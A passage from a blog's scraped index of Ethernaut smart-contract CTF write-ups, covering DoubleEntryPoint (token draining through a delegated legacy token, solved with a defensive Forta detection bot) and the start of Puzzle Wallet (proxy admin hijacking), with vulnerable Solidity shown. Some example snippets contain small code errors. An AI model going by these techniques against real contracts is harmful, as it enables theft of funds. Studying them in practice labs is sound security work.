2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/goodsamaritan/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Custom Errors Manipulation","url":"/tags/custom-errors-manipulation/"},{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729626599,"title":"GoodSamaritan"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for DoubleEntryPoint Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description This level features a CryptoVault with special functionality, the sweepToken function. This is a common function used to retrieve tokens stuck in a contract. The CryptoVault operates with an underlying token that can\u0026rsquo;t be swept, as it is an important core logic component of the CryptoVault. Any other tokens can be swept.\nThe underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.\nIn this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.\nThe contract features a Forta contract where any user can register its own detection bot contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the Forta contract. The bot\u0026rsquo;s implementation will need to raise correct alerts to prevent potential attacks or bug exploits.\nThings that might help:\nHow does a double entry point work for a token contract?\nKey Concepts To Learn We know that once we deploy the contract without implementing upgradability, the contract cannot be modified. Assume you have deployed an ERC20 contract that has become very famous and your token has significant value. Now, you have found a bug in your contract. How are you going to fix it? There is no way to fix the vulnerability directly. However, if we have a pause function to pause the functionality of the contract, we can then shift the entire balances data to a new contract.\nInstead, if we implement bot detection functionality, we can mitigate these risks. Whenever a function in the token contract is called, it should check with the bot detection contract (if deployed); otherwise, it should execute the function as normal. If we discover a vulnerability, we can deploy a bot contract to manage the situation and revert calls if someone attempts to exploit the contract.\nThe below is the example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.6.0; 4 5 6contract contract_one { 7 8 uint256 public balance = 2**256 - 1; // Initializing balance to max uint256 9 10 function deposit(uint256 a) public Notify payable { 11 require(a\u0026lt;=msg.value,\u0026#34;You cannot deposit more than what you paid\u0026#34;); 12 balance += a; 13 } 14 15} If you see the contract contract_one, it is a basic contract that stores deposits. Whenever someone calls the deposit() function by sending some ether, they need to pass the amount they are paying to the contract as an argument to the function. Whenever someone deposits the ether, it will increase the balance by the deposited value. However, if we look at the compiler version, it is 0.6.0, which is vulnerable to overflows. So, after many deposits, when the balance reaches the maximum value of uint256 (2**256 - 1), the next time someone deposits, the balance variable will start from zero again.\nInorder to demonstrate the exploit i just set the balance to 2**256-1. Now you just deploy the contract and call deposit() function by sending 10 wei. After the call you will notice the balance becoming to 9.\nNow imagine during writing and deploying our contract we implemented some code for handling exploits for later use. check the below example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.6.0; 4 5interface IBot { 6 function Validatedata(bytes calldata data) external; 7} 8 9interface Icontract_one { 10 function RaiseAlert() external; 11 function balance() external view returns (uint); 12} 13 14contract contract_one { 15 address owner; 16 uint256 public balance = 2**256 - 1; // Initializing balance to max uint256 17 address Bot_Address; 18 mapping(address =\u0026gt; uint256) botraisedAlerts; 19 20 constructor() public { 21 owner = msg.sender; 22 } 23 24 modifier onlyOwner() { 25 require(msg.sender == owner, \u0026#34;Caller is not the owner\u0026#34;); 26 _; 27 } 28 29 function deposit(uint256 a) public Notify payable { 30 require(a\u0026lt;=msg.value,\u0026#34;You cannot deposit more than what you paid\u0026#34;); 31 balance += a; 32 } 33 34 ////////////////////////////////// 35 ///// Handling Exploit /////////// 36 ////////////////////////////////// 37 38 modifier Notify() { 39 if (Bot_Address == address(0)) { 40 _; 41 return; 42 } 43 uint256 current_Alerts = botraisedAlerts[Bot_Address]; 44 bytes memory data = msg.data; 45 IBot(Bot_Address).Validatedata(data); 46 _; 47 if (botraisedAlerts[Bot_Address] \u0026gt; current_Alerts) { 48 revert(\u0026#34;You have been caught\u0026#34;); 49 } 50 } 51 52 function set_bot(address New_bot) public onlyOwner { 53 Bot_Address = New_bot; 54 } 55 56 function RaiseAlert() external { 57 if (Bot_Address == msg.sender) { 58 botraisedAlerts[msg.sender] += 1; 59 } 60 } 61} 62 63 64contract Bot { 65 function add(uint256 a, uint256 b) internal pure returns (bool) { 66 uint256 c = a + b; 67 return c \u0026gt;= a; 68 } 69 function Validatedata(bytes calldata data) external { 70 uint256 current_balance=Icontract_one(msg.sender).balance(); 71 (uint256 a) = abi.decode(data[4:], (uint256)); 72 73 if (!add(a, current_balance)) { 74 Icontract_one(msg.sender).RaiseAlert(); 75 } 76 balance += a; 77 } 78} The contract contract_one will work the same as the previous example unless we implement the bot. In contract_one, when we call the deposit() function, it will execute the modifier Notify. The modifier Notify will check if the Bot_Address is set or not. If the Bot_Address is the zero address, then the modifier will return without executing any logic, and the deposit() function will execute.\nHowever, if the Bot_Address is set to some address, then the modifier Notify will set the current number of alerts raised by the bot to current_Alerts. It will then store the current calldata (msg.data) in the data variable. After that, it will make a call to Validatedata() in the bot contract and then execute the deposit() logic. Once the deposit() call is completed, the logic in the modifier after _ will execute. In the modifier after _;, it will check whether the current alerts are more than the previous alerts or not. If the alerts are more, it will revert; otherwise, the deposit() will be successful.\nIf a modifier is used in a function, then the modifier will be executed two times during the function call. The modifier will be executed before the execution of the function and after the execution of the function. In the modifier, the logic before _; will be executed before executing the function call, and the logic after _; will be executed after executing the function call.\nNow we found the bug in our deployed contract. The bug is due to overflow. We can implement a bot contract to handle the overflow. If we check the Notify modifier in contract_one, it calls a function Validatedata() in the bot contract. This means that when implementing the bot contract, we should implement a function named Validatedata() in the bot contract. In the Validatedata function, we need to check if someone is trying to exploit the bug. If someone is trying to exploit the bug, the bot contract should call RaiseAlert() in contract_one. The Notify modifier will then handle the alerts and revert the call.\nNow, since the bug is due to overflow, we need to write logic to overcome this issue. The Notify modifier will pass the calldata of deposit() to Validatedata(). The calldata will consist of the function selector of deposit(uint256) and the argument passed. We need to get the depositing amount from the data passed and then add the depositing amount and the current balance of the contract to check whether overflow is happening or not. If overflow happens, then Validatedata() will raise an alert; otherwise, the deposit() function will execute as expected.\nTry the example to understand in detail.\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nThe below is the source code.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import \u0026#34;openzeppelin/contracts/access/Ownable.sol\u0026#34;; 5import \u0026#34;openzeppelin-contracts-08/token/ERC20/ERC20.sol\u0026#34;; 6 7interface DelegateERC20 { 8 function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); 9} 10 11interface IDetectionBot { 12 function handleTransaction(address user, bytes calldata msgData) external; 13} 14 15interface IForta { 16 function setDetectionBot(address detectionBotAddress) external; 17 function notify(address user, bytes calldata msgData) external; 18 function raiseAlert(address user) external; 19} 20 21contract Forta is IForta { 22 mapping(address =\u0026gt; IDetectionBot) public usersDetectionBots; 23 mapping(address =\u0026gt; uint256) public botRaisedAlerts; 24 25 function setDetectionBot(address detectionBotAddress) external override { 26 usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); 27 } 28 29 function notify(address user, bytes calldata msgData) external override { 30 if (address(usersDetectionBots[user]) == address(0)) return; 31 try usersDetectionBots[user].handleTransaction(user, msgData) { 32 return; 33 } catch {} 34 } 35 36 function raiseAlert(address user) external override { 37 if (address(usersDetectionBots[user]) != msg.sender) return; 38 botRaisedAlerts[msg.sender] += 1; 39 } 40} 41 42contract CryptoVault { 43 address public sweptTokensRecipient; 44 IERC20 public underlying; 45 46 constructor(address recipient) { 47 sweptTokensRecipient = recipient; 48 } 49 50 function setUnderlying(address latestToken) public { 51 require(address(underlying) == address(0), \u0026#34;Already set\u0026#34;); 52 underlying = IERC20(latestToken); 53 } 54 55 /* 56 ... 57 */ 58 59 function sweepToken(IERC20 token) public { 60 require(token != underlying, \u0026#34;Can\u0026#39;t transfer underlying token\u0026#34;); 61 token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); 62 } 63} 64 65contract LegacyToken is ERC20(\u0026#34;LegacyToken\u0026#34;, \u0026#34;LGT\u0026#34;), Ownable { 66 DelegateERC20 public delegate; 67 68 function mint(address to, uint256 amount) public onlyOwner { 69 _mint(to, amount); 70 } 71 72 function delegateToNewContract(DelegateERC20 newContract) public onlyOwner { 73 delegate = newContract; 74 } 75 76 function transfer(address to, uint256 value) public override returns (bool) { 77 if (address(delegate) == address(0)) { 78 return super.transfer(to, value); 79 } else { 80 return delegate.delegateTransfer(to, value, msg.sender); 81 } 82 } 83} 84 85contract DoubleEntryPoint is ERC20(\u0026#34;DoubleEntryPointToken\u0026#34;, \u0026#34;DET\u0026#34;), DelegateERC20, Ownable { 86 address public cryptoVault; 87 address public player; 88 address public delegatedFrom; 89 Forta public forta; 90 91 constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) { 92 delegatedFrom = legacyToken; 93 forta = Forta(fortaAddress); 94 player = playerAddress; 95 cryptoVault = vaultAddress; 96 _mint(cryptoVault, 100 ether); 97 } 98 99 modifier onlyDelegateFrom() { 100 require(msg.sender == delegatedFrom, \u0026#34;Not legacy contract\u0026#34;); 101 _; 102 } 103 104 modifier fortaNotify() { 105 address detectionBot = address(forta.usersDetectionBots(player)); 106 107 // Cache old number of bot alerts 108 uint256 previousValue = forta.botRaisedAlerts(detectionBot); 109 110 // Notify Forta 111 forta.notify(player, msg.data); 112 113 // Continue execution 114 _; 115 116 // Check if alarms have been raised 117 if (forta.botRaisedAlerts(detectionBot) \u0026gt; previousValue) revert(\u0026#34;Alert has been triggered, reverting\u0026#34;); 118 } 119 120 function delegateTransfer(address to, uint256 value, address origSender) 121 public 122 override 123 onlyDelegateFrom 124 fortaNotify 125 returns (bool) 126 { 127 _transfer(origSender, to, value); 128 return true; 129 } 130} Now let\u0026rsquo;s break down the given contracts and understand every function in the given contracts.\n1interface DelegateERC20 { 2 function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); 3} 4 5interface IDetectionBot { 6 function handleTransaction(address user, bytes calldata msgData) external; 7} 8 9interface IForta { 10 function setDetectionBot(address detectionBotAddress) external; 11 function notify(address user, bytes calldata msgData) external; 12 function raiseAlert(address user) external; 13} The challenge uses the above three interfaces. The interface DelegateERC20 is used in the LegacyToken contract. The interface IDetectionBot is used in the Forta contract to call the detection bot set by the user. The interface IForta is used by the Forta contract to implement all the functions of IForta in the Forta contract.\n1contract Forta is IForta { 2 mapping(address =\u0026gt; IDetectionBot) public usersDetectionBots; 3 mapping(address =\u0026gt; uint256) public botRaisedAlerts; 4 5 function setDetectionBot(address detectionBotAddress) external override { 6 usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); 7 } 8 9 function notify(address user, bytes calldata msgData) external override { 10 if (address(usersDetectionBots[user]) == address(0)) return; 11 try usersDetectionBots[user].handleTransaction(user, msgData) { 12 return; 13 } catch {} 14 } 15 16 function raiseAlert(address user) external override { 17 if (address(usersDetectionBots[user]) != msg.sender) return; 18 botRaisedAlerts[msg.sender] += 1; 19 } 20} Forta is a contract where users can register and set a detection bot to ensure that contracts owned by the user work as expected. Suppose you deployed your contract and implemented Forta in your contract. Later, if you find a bug in your contract, you can write a Forta bot contract to ensure that the bug won\u0026rsquo;t be exploited. The Forta bot contract will handle the bug.\nThe contract has two state variables named usersDetectionBots and botRaisedAlerts. usersDetectionBots is a mapping of address to IDetectionBot and botRaisedAlerts is a mapping of address to uint256.\n1function setDetectionBot(address detectionBotAddress) external override { 2 usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); 3} This function setDetectionBot() takes an argument of type address as input and sets the usersDetectionBots of msg.sender (caller) to the passed address. When you find a bug in your contract, and if the bug can be fixed with a bot contract, you create the bot contract and call setDetectionBot() by passing the address of the bot contract.\n1function notify(address user, bytes calldata msgData) external override { 2 if (address(usersDetectionBots[user]) == address(0)) return; 3 try usersDetectionBots[user].handleTransaction(user, msgData) { 4 return; 5 } catch {} 6} The function notify() takes an address and bytes as input. The address is the address of the user, and the bytes data is calldata sent by the caller (AKA msg.sender). The function checks if the user has any bots. If the user has no bot, the function returns. If the user has a bot, the function calls the handleTransaction() function in the bot contract.\nIn the example i explained you can consider user as owner.\n1function raiseAlert(address user) external override { 2 if (address(usersDetectionBots[user]) != msg.sender) return; 3 botRaisedAlerts[msg.sender] += 1; 4} The function raiseAlert() takes an argument of type address, which is the address of the user. It then checks if the caller of raiseAlert() is the bot contract of the user. If not, it will return; otherwise, it will increase the botRaisedAlerts of the bot contract by 1.\nIn our example, once you write the bot contract to handle the bug, if someone tries to exploit the bug, our bot contract will catch the exploit and raise an alert. Then, using a modifier, we can handle the function by comparing botRaisedAlerts before and after call.\nI hope this make sense if you are not clear with anything you can ask questions in Discussions.\n1contract CryptoVault { 2 address public sweptTokensRecipient; 3 IERC20 public underlying; 4 5 constructor(address recipient) { 6 sweptTokensRecipient = recipient; 7 } 8 9 function setUnderlying(address latestToken) public { 10 require(address(underlying) == address(0), \u0026#34;Already set\u0026#34;); 11 underlying = IERC20(latestToken); 12 } 13 14 /* 15 ... 16 */ 17 18 function sweepToken(IERC20 token) public { 19 require(token != underlying, \u0026#34;Can\u0026#39;t transfer underlying token\u0026#34;); 20 token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); 21 } 22} This contract has two state variables: sweptTokensRecipient and underlying. sweptTokensRecipient is of type address, and underlying is of type IERC20, which means the underlying contract will have all the functions in the IERC20 interface.\n1constructor(address recipient) { 2 sweptTokensRecipient = recipient; 3} The constructor() takes an argument of type address as input. It sets the sweptTokensRecipient to the address passed to the constructor() during deployment.\n1function setUnderlying(address latestToken) public { 2 require(address(underlying) == address(0), \u0026#34;Already set\u0026#34;); 3 underlying = IERC20(latestToken); 4} The function setUnderlying() takes an argument of type address as input and checks whether the underlying token is already set or not. If it is not set, then it will set the underlying to the address passed during the function call.\n1function sweepToken(IERC20 token) public { 2 require(token != underlying, \u0026#34;Can\u0026#39;t transfer underlying token\u0026#34;); 3 token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); 4} The function sweepToken() will take an argument of type IERC20 (token) as input and check if the token passed is the underlying token or not. If it is the underlying token, then the function will revert. If the token passed is not the underlying token, then the function will call the transfer() function in the token contract, transferring the total balance of tokens in the contract to sweptTokensRecipient.\n1contract LegacyToken is ERC20(\u0026#34;LegacyToken\u0026#34;, \u0026#34;LGT\u0026#34;), Ownable { 2 DelegateERC20 public delegate; 3 4 function mint(address to, uint256 amount) public onlyOwner { 5 _mint(to, amount); 6 } 7 8 function delegateToNewContract(DelegateERC20 newContract) public onlyOwner { 9 delegate = newContract; 10 } 11 12 function transfer(address to, uint256 value) public override returns (bool) { 13 if (address(delegate) == address(0)) { 14 return super.transfer(to, value); 15 } else { 16 return delegate.delegateTransfer(to, value, msg.sender); 17 } 18 } 19} The above contract is an implementation of ERC20 contract. All the functionalities will same except the mint() and transfer() function.\nThe contract has a state variable delegate of type DelegateERC20 interface.\n1function mint(address to, uint256 amount) public onlyOwner { 2 _mint(to, amount); 3} The function mint() takes two arguments of type address (to) and uint256 (amount) as input. It can only be called by the owner of the contract because when the function is called, it will execute the onlyOwner modifier, which is defined in the Ownable contract.\n1function delegateToNewContract(DelegateERC20 newContract) public onlyOwner { 2 delegate = newContract; 3} The function delegateToNewContract() takes an argument of type DelegateERC20 and and sets the delegate to address passed in function call.\n1 2function transfer(address to, uint256 value) public override returns (bool) { 3 if (address(delegate) == address(0)) { 4 return super.transfer(to, value); 5 } else { 6 return delegate.delegateTransfer(to, value, msg.sender); 7 } 8} The function transfer() will take two arguments of type address (to) and uint256 (value) as inputs. It will call the transfer() function in the ERC20 contract if the address of delegate is zero; otherwise, it will call the delegateTransfer() function in the delegate (DelegateERC20) contract. It will return the value returned by one of the above calls.\n1contract DoubleEntryPoint is ERC20(\u0026#34;DoubleEntryPointToken\u0026#34;, \u0026#34;DET\u0026#34;), DelegateERC20, Ownable { 2 address public cryptoVault; 3 address public player; 4 address public delegatedFrom; 5 Forta public forta; 6 7 constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) { 8 delegatedFrom = legacyToken; 9 forta = Forta(fortaAddress); 10 player = playerAddress; 11 cryptoVault = vaultAddress; 12 _mint(cryptoVault, 100 ether); 13 } 14 15 modifier onlyDelegateFrom() { 16 require(msg.sender == delegatedFrom, \u0026#34;Not legacy contract\u0026#34;); 17 _; 18 } 19 20 modifier fortaNotify() { 21 address detectionBot = address(forta.usersDetectionBots(player)); 22 23 // Cache old number of bot alerts 24 uint256 previousValue = forta.botRaisedAlerts(detectionBot); 25 26 // Notify Forta 27 forta.notify(player, msg.data); 28 29 // Continue execution 30 _; 31 32 // Check if alarms have been raised 33 if (forta.botRaisedAlerts(detectionBot) \u0026gt; previousValue) revert(\u0026#34;Alert has been triggered, reverting\u0026#34;); 34 } 35 36 function delegateTransfer(address to, uint256 value, address origSender) 37 public 38 override 39 onlyDelegateFrom 40 fortaNotify 41 returns (bool) 42 { 43 _transfer(origSender, to, value); 44 return true; 45 } 46} The contract DoubleEntryPoint is an implementation of ERC20 token. The name of the token implemented in DoubleEntryPoint is DET.\nThe contract has state variales cryptoVault (address), player (address), delegatedFrom (address), forta (Forta).\n1constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) { 2 delegatedFrom = legacyToken; 3 forta = Forta(fortaAddress); 4 player = playerAddress; 5 cryptoVault = vaultAddress; 6 _mint(cryptoVault, 100 ether); 7} The constructor takes arguments of type address (legacyToken), address (vaultAddress), address (fortaAddress), address (playerAddress). It sets the delegatedFrom to legacyToken, forta to instance of Forta, player to playerAddress, cryptoVault to vaultAddress. Then it mint\u0026rsquo;s cryptoVault 100 * 10**18 tokens.\n1modifier onlyDelegateFrom() { 2 require(msg.sender == delegatedFrom, \u0026#34;Not legacy contract\u0026#34;); 3 _; 4} The modifier onlyDelegateFrom() will check if the msg.sender (caller) is delegatedFrom or not. If it is, then it will continue executing the function; otherwise, it will revert the function call in which the onlyDelegateFrom() modifier is used.\n1modifier fortaNotify() { 2 address detectionBot = address(forta.usersDetectionBots(player)); 3 4 // Cache old number of bot alerts 5 uint256 previousValue = forta.botRaisedAlerts(detectionBot); 6 // Notify Forta 7 forta.notify(player, msg.data); 8 // Continue execution 9 _; 10 11 // Check if alarms have been raised 12 if (forta.botRaisedAlerts(detectionBot) \u0026gt; previousValue) revert(\u0026#34;Alert has been triggered, reverting\u0026#34;); 13} The modifier fortaNotify() will take the detection bot of the player and store the number of alerts raised by that bot in previousValue. Then it will call notify() in the Forta contract with arguments as the player\u0026rsquo;s address and msg.data (calldata). It will then complete the execution of the function in which the fortaNotify() modifier is used. Once the function call is completed, it will compare the bot raised alerts before and after the function call. If the bot raised alerts after the call are more than before the function call, the function call will be reverted.\n1function delegateTransfer(address to, uint256 value, address origSender)public override onlyDelegateFrom fortaNotify returns (bool){ 2 _transfer(origSender, to, value); 3 return true; 4} The function delegateTransfer() takes arguments of type address (to), uint256 (value), and address (origSender) as input. It will execute the modifiers onlyDelegateFrom and fortaNotify. If the modifiers execute successfully, then the function will transfer DET tokens from origSender to the recipient (to) by calling the _transfer() function in ERC20 contract. After the call the function will return true.\nExploit According to the challenge, we need to make sure that the CryptoVault contract works as expected. It should not allow DET tokens to be swept.\nWe are able to call sweepToken() by passing the address of LegacyToken (LGT) tokens. Then the sweepToken() will make a call to transfer() in the LegacyToken contract. The LegacyToken contract has a state variable named delegate. If the delegate is set to an address, then the transfer() function in LegacyToken will call the delegateTransfer() function at the delegate address.\nIf we check the DoubleEntryPoint contract, it is implementing the function delegateTransfer(). So in LegacyToken, the delegate is set to the address of DoubleEntryPoint. When we call sweepToken(), it makes a call to transfer() in LegacyToken, and the transfer() in LegacyToken calls the delegateTransfer() in DoubleEntryPoint. The delegateTransfer() will send tokens from the CryptoVault contract to sweptTokensRecipient in CryptoVault. But if we see the tokens which delegateTransfer() is transferring, it is DET tokens. According to the challenge, no one should be able to withdraw DET tokens from CryptoVault. So now we need to write a contract to prevent the exploit.\nNow let\u0026rsquo;s write a contract to prevent this exploit. Our logic will be simple: when the delegateTransfer is called, we will check if the origSender is the address of CryptoVault or not. If it is CryptoVault, then the contract will raise an alert.\nThe below is the contract to prevent this exploit.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface IForta { 5 function setDetectionBot(address detectionBotAddress) external; 6 function notify(address user, bytes calldata msgData) external; 7 function raiseAlert(address user) external; 8} 9 10 11contract PreventDoubleEntry{ 12 IForta forta; 13 constructor(){ 14 forta=IForta(//__YOUR_FORTA_ADDRESS__); 15 } 16 function handleTransaction(address user, bytes calldata msgData) external{ 17 (,,address _origSender) = abi.decode(msgData[4:], (address, uint256, address)); 18 if(_origSender==//__CRYPTO_VAULT_ADDRESS__){ 19 forta.raiseAlert(user); 20 } 21 } 22 23} Now open the console and enter the following commands to get the FORTA address and the CRYPTOVAULT address.\n1\u0026gt; await contract.cryptoVault() 1\u0026gt; await contract.forta() Set the cryptovault address and forta address in PreventDoubleEntry and deploy it, and then call the setDetectionBot() function in the Forta contract by passing the address of PreventDoubleEntry. Remember that the player in DoubleEntryPoint will be our wallet address. So when the notify() function in Forta checks for the bot, it will check the bots of the user (player). When setDetectionBot() is called, it will set the bot of msg.sender to the address passed. Therefore, we must call from our account to set the bot instead of calling from the bot contract itself.\nYou cal load the the deployed Forta contract in remix by the compiling the Forta contract then copy the Forta address and click At Address. Check the below image.\nOnce you click \u0026ldquo;At Address\u0026rdquo; by entering the address of the Forta contract, it will load all the functions of the Forta contract. Then call the setDetectionBot() function by passing the address of PreventDoubleEntry. Once the call is done, the challenge will be solved.\nThat\u0026rsquo;s it for this challenge. Hope you liked the writeup.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/doubleentrypoint/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729626553,"title":"DoubleEntryPoint"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Puzzle Wallet Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Nowadays, paying for DeFi operations is impossible, fact.\nA group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.\nThey needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\nLittle did they know, their lunch money was at risk…\nYou\u0026rsquo;ll need to hijack this wallet to become the admin of the proxy.\nThings that might help:\nUnderstanding how delegatecall works and how msg.sender and msg.value behaves when performing one. Knowing about proxy patterns and the way they handle storage variables. Key Concepts To Learn Everyone will say that once we write a contract and deploy it to the blockchain, there is no way we can change the contract. But what if I say there is a way in which you can change the logic of your contract?\nYes, there is a way to upgrade smart contracts.\nIf we write all our state variables in one contract and write the logic of how the first contract should work in another contract, then make a delegate call from the state variables contract to the logic contract, all the logic will be executed in the logic contract and state changes will be done in the state variables contract. Confused? Check the example below.\nCheck the below example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract State_contract{ 6 7 uint256 public Latest_Random_Number; 8 address implementation; 9 10 constructor(address _addr){ 11 implementation=_addr; 12 } 13 14 function get_RandomNumber() public returns(uint256){ 15 implementation.delegatecall(abi.encodeWithSignature(\u0026#34;generate_RandomNumber()\u0026#34;)); 16 } 17 18} 19 20contract Logic_contract{ 21 uint256 public Latest_Random_Number; 22 23 function generate_RandomNumber() public{ 24 Latest_Random_Number=(block.timestamp)%69; 25 26 } 27} First, we need to deploy the Logic_contract. Then we need to deploy the State_contract by passing the address of the Logic_contract as an argument to the constructor.\nWhen we call get_RandomNumber() in State_contract, the function will make a delegate call to generate_RandomNumber() in Logic_contract and set the Latest_Random_Number to (block.timestamp)%69. Now, since it is a delegate call, the logic will be executed in the Logic_contract and the variable Latest_Random_Number will be changed in the State_contract.\nI hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.\nNow, what if we wanted to change the method in which the random number is generated? Should we deploy the above two contracts again? No, instead of deploying the two contracts again, we can add one more function to change the implementation (logic contract) address during the first deployment itself. Check the example below.\nCheck the below example.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract State_contract{ 5 uint256 public Latest_Random_Number; 6 address owner; 7 address implementation; 8 9 constructor(address _addr){ 10 implementation=_addr; 11 owner=msg.sender; 12 } 13 modifier onlyOwner(){ 14 require(msg.sender==owner); 15 _; 16 } 17 function get_RandomNumber()public returns(uint256){ 18 implementation.delegatecall(abi.encodeWithSignature(\u0026#34;generate_RandomNumber()\u0026#34;)); 19 } 20 21 function change_Implementation(address _newImplementation)public{ 22 implementation=_newImplementation; 23 } 24} 25 26contract Logic_contract{ 27 uint256 public Latest_Random_Number; 28 29 function generate_RandomNumber()public{ 30 Latest_Random_Number=(block.timestamp)%69; 31 } 32} 33 34contract Updated_Logic_contract{ 35 uint256 public Latest_Random_Number; 36 37 function generate_RandomNumber()public{ 38 Latest_Random_Number=uint256(blockhash(block.number-1)); 39 } 40} Deploy the first two contracts same as the first example. The difference between State_contract in the first example and now is that we added a function to change the address of the implementation in the new example.\nSo, if we deploy this example same as the first example, whenever we call the get_RandomNumber() function, it will make a delegate call to Logic_contract and execute the logic in Logic_contract, changing the Latest_Random_Number in State_contract. Now, the logic in which the random number is determined is (block.timestamp)%69.\nSuppose we wanted to change the logic in which the random number is generated. Now, what we do is write a new contract with a new logic for random number calculation and deploy the new contract. Once the deployment is completed, we will copy the address of the new logic address and pass the new logic address while calling the change_Implementation() function in the Logic contract.\nThe next time we call get_RandomNumber() in State_contract, the random number will be generated from the new logic contract. In this example, we have written a new contract named Updated_Logic_contract and changed the logic in which the random number is generated.\nI hope this makes sense. I suggest everyone try out the above example in Remix by deploying it in Remix test environments.\nContract Explanation If you are in this challenge, then you would have probably solved the challenges related to delegate call and storage layout of contracts.\nIf you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5pragma experimental ABIEncoderV2; 6 7import \u0026#34;../helpers/UpgradeableProxy-08.sol\u0026#34;; 8 9contract PuzzleProxy is UpgradeableProxy { 10 address public pendingAdmin; 11 address public admin; 12 13 constructor(address _admin, address _implementation, bytes memory _initData) 14 UpgradeableProxy(_implementation, _initData) 15 { 16 admin = _admin; 17 } 18 19 modifier onlyAdmin() { 20 require(msg.sender == admin, \u0026#34;Caller is not the admin\u0026#34;); 21 _; 22 } 23 24 function proposeNewAdmin(address _newAdmin) external { 25 pendingAdmin = _newAdmin; 26 } 27 28 function approveNewAdmin(address _expectedAdmin) external onlyAdmin { 29 require(pendingAdmin == _expectedAdmin, \u0026#34;Expected new admin by the current admin is not the pending admin\u0026#34;); 30 admin = pendingAdmin; 31 } 32 33 function upgradeTo(address _newImplementation) external onlyAdmin { 34 _upgradeTo(_newImplementation); 35 } 36} 37 38contract PuzzleWallet { 39 address public owner; 40 uint256 public maxBalance; 41 mapping(address =\u0026gt; bool) public whitelisted; 42 mapping(address =\u0026gt; uint256) public balances; 43 44 function init(uint256 _maxBalance) public { 45 require(maxBalance == 0, \u0026#34;Already initialized\u0026#34;); 46 maxBalance = _maxBalance; 47 owner = msg.sender; 48 } 49 50 modifier onlyWhitelisted() { 51 require(whitelisted[msg.sender], \u0026#34;Not whitelisted\u0026#34;); 52 _; 53 } 54 55 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted { 56 require(address(this).balance == 0, \u0026#34;Contract balance is not 0\u0026#34;); 57 maxBalance = _maxBalance; 58 } 59 60 function addToWhitelist(address addr) external { 61 require(msg.sender == owner, \u0026#34;Not the owner\u0026#34;); 62 whitelisted[addr] = true; 63 } 64 65 function deposit() external payable onlyWhitelisted { 66 require(address(this).balance \u0026lt;= maxBalance, \u0026#34;Max balance reached\u0026#34;); 67 balances[msg.sender] += msg.value; 68 } 69 70 function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted { 71 require(balances[msg.sender] \u0026gt;= value, \u0026#34;Insufficient balance\u0026#34;); 72 balances[msg.sender] -= value; 73 (bool success,) = to.call{value: value}(data); 74 require(success, \u0026#34;Execution failed\u0026#34;); 75 } 76 77 function multicall(bytes[] calldata data) external payable onlyWhitelisted { 78 bool depositCalled = false; 79 for (uint256 i = 0; i \u0026lt; data.length; i++) { 80 bytes memory _data = data[i]; 81 bytes4 selector; 82 assembly { 83 selector := mload(add(_data, 32)) 84 } 85 if (selector == this.deposit.selector) { 86 require(!depositCalled, \u0026#34;Deposit can only be called once\u0026#34;); 87 // Protect against reusing msg.value 88 depositCalled = true; 89 } 90 (bool success,) = address(this).delegatecall(data[i]); 91 require(success, \u0026#34;Error while delegating call\u0026#34;); 92 } 93 } 94} In the challenge, they have given us two contracts: PuzzleProxy and 